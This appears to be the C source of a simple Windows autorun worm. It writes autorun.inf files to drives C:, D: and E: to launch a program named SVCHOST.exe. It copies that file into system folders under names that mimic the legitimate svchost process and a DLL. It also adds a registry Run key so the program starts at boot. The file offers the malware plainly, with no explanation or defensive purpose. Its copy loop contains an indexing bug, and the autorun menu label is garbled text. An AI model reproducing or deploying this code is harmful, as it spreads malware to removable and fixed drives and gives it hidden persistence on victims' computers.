#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#define SVCHOST_NUM 6
#define null NULL
int copy(char *,char *);
char *autorun="[autorun]\nopen=SVCHOST.exe\n\nshell\\1=´ò¿ª\nshell\\1\\Command=SVCHOST.exe\nshell\\2\\Command=SVCHOST.exe\nshellexecute=SVCHOST.exe";
char *files_autorun[10]={"C:\\autorun.inf","D:\\autorun.inf","E:\\autorun.inf"};
char *files_svchost[SVCHOST_NUM+1]={"C:\\windows\\system\\MSMOUS.dll","C:\\windows\\system\\SVCHOST.exe","C:\\windows\\SVCHOST.exe","C:\\SVCHOST.exe","D:\\SVCHOST.exe","E:\\SVCHOST","SVCHOST.exe"};
char *regadd="reg add \"HKLM\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\Run\"/v SVCHOST /d C:\\windows\\system\\SVCHOST.exe/f";

int main()
{
   FILE *input,*output;
   int i,k;
   for(i=0;i<3;++i)
   {
	   output=fopen(files_autorun[i],"w");
	   fprintf(output,"%s",autorun);
	   fclose(output);
   }

   if((input=fopen(files_svchost[SVCHOST_NUM],"rb"))!=null)
   {
	   fclose(input);
	   for(k=0;k<SVCHOST_NUM;++k)
	   {
		   copy(files_svchost[i],files_svchost[k]);
	   }
   }

   system(regadd);
   return 0;
}
int copy( char *infile,char *outfile)
{
	FILE *input,*output;
	char c;
	input=fopen(infile,"rb");
	output=fopen(outfile,"wb");
    if(strcmp(infile,outfile)!=0&&input!=null&&output!=null)
	{
		while(!feof(input))
		{
			fread(&c,1,1,input);
			fwrite(&c,1,1,output);
		}
		return 1;
	}
	else
		return 0;
}
